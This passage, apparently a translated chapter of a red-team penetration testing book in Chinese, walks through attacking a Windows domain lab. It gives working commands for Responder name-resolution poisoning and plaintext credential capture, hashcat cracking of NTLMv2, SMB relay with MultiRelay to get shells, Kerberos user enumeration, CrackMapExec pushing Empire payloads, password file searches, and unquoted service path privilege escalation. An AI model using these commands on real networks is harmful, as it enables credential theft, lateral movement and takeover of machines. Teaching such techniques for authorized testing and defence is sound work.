最后，在根域应用您的GPO。
将操作系统的所有用户设置为自动登录（这只会使测试工作变得更加轻松）。在每次机器启动或重新启动时，用户都会自动登录，我们可以轻松地测试攻击效果，实现从内存中提取凭证。
4.3 在没有凭证的网络上
4.3.1 Responder
就像之前的行动，我们使用Responder工具（可在GitHub网站搜索）监听网络和欺骗响应数据，从而获取网络上的凭证。回顾本书第2版的内容，当网络上的系统查找DNS主机名失败时，该被攻击者系统将链路本地多播名称解析（LLMNR）和Net-BIOS（NBT-NS）名称服务用于名称解析备份。当被攻击者主机无法通过DNS查询时，被攻击者开始询问网络上的主机是否可以解析该主机名。
有一个简单且通用的例子：假设您的主机有一个固定加载驱动\cyberspacekittenssecretdrive\ secrets。有一天，IT部门从网络中删除了该共享驱动器，它已不再存在。由于主机仍然加载驱动器到服务器，因此系统将不断询问网络是否有主机知道驱动器的IP地址。现在，这个文件共享可能很难找到，由于网络中存在先前连接的系统的可能性很高，因此这个问题仍然会发生。我们已经从安装的驱动器、具有硬编码服务器的应用程序中看到这个问题，而且很多时候仅仅是配置错误。
我们可以使用类似Responder的工具来利用那些寻找主机名的系统，并使用恶意服务器对其进行响应。更棒的是，Responder 工具可以更进一步，充当 Web 代理自动发现（WPAD）协议服务器，通过攻击者服务器代理所有的数据，但这是另外一种攻击方式。
cd /opt/Responder。
./Responder.py -I eth0 -wrf。
现在，因为处于Windows企业环境中，所以可以假设Responder工具正在活动目录中运行。因此，如果响应来自受害主机的DNS查询，就可以让其连接到我们的SMB共享。由于它们连接到驱动器\cyberspacekittenssecretdrive，因此我们将强制被攻击者使用NTLMv2凭证（或缓存凭证）进行身份验证，如图4.4所示。捕获的这些凭证不是直接的NTLM散列值，而是NTLM质询/响应散列值（NTLMv2-SSP）。NTLMv2-SSP散列值暴力破解的速度，比普通的NTLM散列值慢得多，但这不是大问题，因为我们可以使用大型破解设备实现破解（参见第8章）。
图4.4
我们可以输入NTLMv2散列，将其传递给hashcat工具，破解密码。在hashcat工具中，我们需要为NetNTLMv2指定散列格式“-m”。
hashcat -m 5600 hashes\ntlmssp_hashes.txt passwordlists/*。
现在，假设我们真的不想破解散列，或者我们不介意弹出对话框（提醒用户此处可疑）。我们可以不使用NetNTLMv2鉴权方式，强制使用基本的鉴权方式，参数是F（ForceWpadAuth）和b（基本身份验证）。
python ./Responder.py -I eth0 -wfFbv。
从图4.5可以看出，系统将提示用户输入用户名和密码，大多数人都会不自觉地输入。一旦用户提交了凭证，我们就能以明文形式捕获凭证，如图4.6所示。
图4.5
图4.6
4.3.2 更好的Responder（MultiRelay.py）
Responder工具和破解NTLMv2-SSP散列的问题在于破解这些散列值所需的时间可能很长。更糟糕的是，在这个环境中，管理员的密码长度超过20个字符。那么，在这个场景中，我们能做些什么呢？
如果目标没有强制执行SMB签名（可以使用快速Nmap脚本扫描找到它），那么我们可以使用一个小技巧，重放捕获的SMB请求。
Laurent Gaffie在Responder中加入了一个工具来处理身份鉴权的重放攻击。在Per Laurent的网站上，Responder的工具文件夹中包含MultiRelay工具，它是一个强大的渗透测试程序，使您能够对选定的目标执行NTLMv1和NTLMv2中继攻击。目前，MultiRelay支持将HTTP、WebDav、代理和SMB身份验证协议中继到SMB服务器。该工具可以定制接收多个用户中继，仅针对域管理员、本地管理员或特权账户。
从更高的层面来说，MultiRelay将根据我们的设置，转发身份鉴权请求到被攻击者主机，而不是强制被攻击者向我们的SMB共享发送身份鉴权请求。当然，该中继用户需要访问另一台机器；如果成功，我们不需要处理任何密码或暴力破解。首先，需要配置Responder和MultiRelay工具。
编辑Responder配置文件，禁用SMB和HTTP服务器。 
gedit Responder.conf
将SMB和HTTP更改为“关闭”
启动Responder工具。 
python ./Responder.py -I eth0 -rv
在新的终端窗口中启动MultiRelay。 
/opt/Responder/tools
./MultiRelay.py -t  -c  -u ALL
一旦中继到被攻击者主机的目标实现，如图4.7所示，就需要考虑在被攻击者主机上执行的内容。默认情况下，MultiRelay可以生成基本Shell，但我们也可以自动执行Meterpreter PowerShell静荷、Empire PowerShell静荷、dnscat2 PowerShell静荷、PowerShell下载脚本和执行C2代理、Mimikatz，或者只运行calc.exe工具。
图4.7
4.3.3 PowerShell Responder
一旦突破了Windows系统，我们就可以使用PowerShell工具对被攻击者开展Responder攻击。早期的Responder的两个功能可以通过以下两个工具实现。
Inveigh。
Inveigh-Relay。
为了使事情变得更加简单，所有这些工具都已经集成到Empire中。
4.4 没有凭证的用户枚举
一旦进入网络，我们就可以使用Responder工具获取凭证或Shell，但有时也会出现这种情况——目标启用SMB签名并且破解NTLMv2 SSP不可行。此时，我们可退后一步，从基本的攻击方式开始。在无法主动扫描网络的情况下，我们需要获得一个用户列表（可能是密码喷射甚至社会工程）。
一种选择是开始针对域控制器枚举用户。从历史上看（早在2003年），我们可以尝试执行RID循环以获取所有用户账户的列表。虽然这种方法已经不可用，但还有其他选项可用于暴力破解账户。另一种选择是利用Kerberos，如图4.8所示。
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm= "cyberspacekittens. local",userdb=/opt/userlist.txt。
图4.8
我们需要提供一个测试的用户名列表，但是由于只是查询域控制器并且不对其进行身份鉴权，因此这个操作通常不会被发现。现在，我们可以使用这些用户账户并再次进行密码喷射攻击！
4.5 使用CrackMapExec（CME）扫描网络
如果还没有突破的系统，但我们确实通过Responder、配置错误的网络应用程序、暴力破解或打印机获得了凭证，那么可以尝试扫描网络，查看账户可以登录的位置。使用像CrackMapExec（CME）等工具进行简单的扫描，可以帮助找到内部网络初始突破点。
从已经取得的效果看，我们使用CME扫描网络，识别/验证网络上的SMB资源，在多个主机上远程执行命令，甚至通过Mimikatz提取明文凭证。Empire和CME提供新的功能，我们可以利用Empire的REST功能。在下面的场景中，我们将使用其REST API启动Empire，在CME中配置密码，将CME连接到Empire，使用掌握的单个凭证扫描网络，最后，如果通过身份鉴权，则自动推送Empire静荷到远程被攻击者的系统，如图4.9所示。如果您有帮助账户或特权账户，那么准备加载Empire shells吧！
图4.9
启动Empire的REST API服务器。 
cd /opt/Empire
./empire --rest –password 'hacktheuniverse'
更改CrackMapExec密码。 
gedit /root/.cme/cme.conf
password=hacktheuniverse
运行CME，生成Empire Shell。 
cme smb 10.100.100.0/24 –d 'cyberspacekittens.local' –u '' – p '' - M empire_exec -o LISTENER = http
4.6 突破第一台主机
通过社会工程、潜伏设备、Responder工具、攻击打印机或其他攻击方式，您获得了主机的访问权限，您接下来要做什么？这是一个难题。
在过去，通常是了解所处的位置以及周围的网络。我们最初可能会运行类似于“netstat -ano”的命令来查找被攻击者服务器的IP地址范围、域和用户。我们还可以执行“ps”或“sc queryex type = service state = all | find”_NAME“”之类的命令列出所有正在运行的服务，并查找杀毒软件或其他主机保护。以下是最初可能运行的一些命令。
网络信息。 
netstat -anop | findstr LISTEN
net group "Domain Admins"/domain
进程列表。 
tasklist/v
系统主机信息。 
sysinfo
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\ temp \ os.txt
wmic qfe get Caption,Description,HotFixID,InstalledOn
简单文件搜索。 
dir/s *password*
findstr/s/n/i/p foo *
findstr/si pass * .txt | * .xml | * .ini
共享/已安装驱动器的信息。 
powershell -Command "get-WmiObject -class Win32_Share"
powershell -Command "get-PSDrive"
powershell -Command "Get-WmiObject -Class Win32_MappedLogicalDisk | select Name，ProviderName"
其实绝大部分人并没有时间记住所有这些命令，幸运的是我们有RTFM一书（很棒的资源），leostat创建了一个快速的Python脚本，包含大量这样的命令，可以在一个名为rtfm.py的工具中轻松搜索。
更新并运行RTFM。 
cd /opt/rtfm
chmod + x rtfm.py
./rtfm.py -u
./rtfm.py -c 'rtfm'
搜索所有标签。 
./rtfm.py -Dt
查看每个标签的查询/命令。我喜欢使用枚举类别，如图4.10所示。 
./rtfm.py -t enumeration | more
现在，RTFM 包含的命令非常丰富，并且这些命令都很实用。这对于任何行动来说是非常好的资源。
这些都是我们为了获取信息而一直在做的事情，但是如果我们能从环境中获得更多信息呢？使用PowerShell，我们可以获得所需的网络/环境信息。由于PowerShell可以在任何命令和控制工具中轻松执行，因此您可以使用Empire、Metasploit或Cobalt Strike来做这些实验。在以下示例中，我们将使用Empire，但您也可以尝试使用其他工具。
图4.10
4.7 权限提升
从常规用户升级到特权账户有很多不同的方法。
下面介绍一下不带引号的服务路径漏洞。
这是一个相当简单和常见的漏洞，服务可执行文件路径未被引号括起。因为在路径周围没有引号，所以我们可以利用这个服务。假设我们有一个配置为执行C:\Program Files (x86)\Cyber Kittens\Cyber Kittens.exe的服务。如果具有Cyber Kittens 文件夹写权限，那么我们可以将恶意软件放到目录 C:\Program Files (x86)\Cyber Kittens\Cyber.exe（注意，缺少 Kittens.exe）。如果服务随系统启动执行，我们可以等到服务重新启动，并将恶意软件以特权账户运行。
如何查找易受攻击的服务路径。 
wmic service get name,displayname,pathname,startmode |findstr/i "Auto" |findstr/i/v "C:\Windows\" |findstr/i/v """
查找BINARY_PATH_NAME
查找不安全的服务注册表权限。
识别允许更新服务映像路径位置的权限漏洞。
检查AlwaysInstallElevated注册表项是否启用。